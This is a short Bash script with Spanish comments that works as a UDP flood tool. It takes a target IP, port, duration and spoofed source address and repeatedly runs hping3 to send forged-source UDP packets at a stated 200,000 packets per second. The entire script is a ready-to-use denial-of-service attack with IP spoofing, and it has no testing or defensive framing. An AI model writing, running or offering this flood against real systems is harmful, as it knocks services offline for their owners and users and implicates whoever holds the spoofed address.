#!/bin/bash

# Uso: ./udp_spoof_single_fast.sh -ip IP_DESTINO -port PUERTO -t TIEMPO(segundos) -s IP_SPOOF

while [[ $# -gt 0 ]]; do
  case $1 in
    -ip)
      TARGET_IP="$2"
      shift 2
      ;;
    -port)
      TARGET_PORT="$2"
      shift 2
      ;;
    -t)
      TIME="$2"
      shift 2
      ;;
    -s)
      SPOOF_IP="$2"
      shift 2
      ;;
    *)
      echo "Parámetro desconocido: $1"
      exit 1
      ;;
  esac
done

if [[ -z "$TARGET_IP" || -z "$TARGET_PORT" || -z "$TIME" || -z "$SPOOF_IP" ]]; then
  echo "Uso: $0 -ip IP_DESTINO -port PUERTO -t TIEMPO(segundos) -s IP_SPOOF"
  exit 1
fi

echo "Enviando paquetes UDP durante $TIME segundos a $TARGET_IP:$TARGET_PORT con spoof IP $SPOOF_IP..."
echo "Intentando velocidad: 200000 paquetes/segundo"

END=$((SECONDS+TIME))
while [ $SECONDS -lt $END ]; do
  sudo hping3 --spoof $SPOOF_IP --udp -p $TARGET_PORT --fast --interval u5 -c 200000 $TARGET_IP
done

echo "Finalizado."
